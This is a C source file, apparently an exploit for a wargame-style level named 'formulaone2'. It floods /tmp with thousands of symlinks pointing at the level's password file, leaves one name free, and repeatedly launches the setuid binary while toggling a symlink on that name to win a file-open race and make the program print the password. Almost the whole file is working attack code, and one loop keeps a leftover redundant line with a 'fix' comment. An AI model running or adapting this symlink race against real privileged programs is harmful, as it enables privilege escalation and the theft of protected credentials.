/* formulaone2 attack:
   1. create 26^4-1 symlinks /tmp/tmp_XXXX -> password file (all but one "hole")
   2. fork: exec /formulaone/formulaone2 (spins in mytmpnam until it picks the hole)
   3. parent: tight loop symlink(password, hole) - win the fopen race
   4. the setuid binary cats the password file and fwrites it to stdout */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>

#define PWFILE "/etc/formulaone_pass/formulaone2"
#define HOLE "tmp_mzzz"   /* the one name left free */

int main(void) {
    char name[32];
    long made = 0;
    for (int a = 0; a < 26; a++)
      for (int b = 0; b < 26; b++)
        for (int c = 0; c < 26; c++)
          for (int d = 0; d < 26; d++) {
            snprintf(name, sizeof(name), "/tmp/tmp_%c%c%c%c", 'a'+a, 'b'+b-0, 'a'+c, 'a'+d);
            /* fix: use 'a'+b properly below; rebuild name correctly */
            snprintf(name, sizeof(name), "/tmp/tmp_%c%c%c%c", 'a'+a, 'a'+b, 'a'+c, 'a'+d);
            if (strcmp(name+5, HOLE) == 0) continue;
            if (symlink(PWFILE, name) == 0) made++;
          }
    fprintf(stderr, "made %ld symlinks\n", made);

    for (int round = 0; round < 200; round++) {
        pid_t p = fork();
        if (p == 0) {
            execl("/formulaone/formulaone2", "formulaone2", (char*)0);
            _exit(127);
        }
        /* race: TOGGLE the hole - up (password symlink) / down - so the stat loop
           can observe it free while fopen has a ~50% chance to see it occupied */
        int alive = 1;
        for (int t = 0; t < 20000 && alive; t++) {
            if (waitpid(p, NULL, WNOHANG) != 0) alive = 0;
            symlink(PWFILE, "/tmp/" HOLE);
            unlink("/tmp/" HOLE);
        }
        if (alive) kill(p, SIGKILL);
        waitpid(p, NULL, 0);
        /* if the child printed anything it went to stdout of THIS process */
    }
    return 0;
}
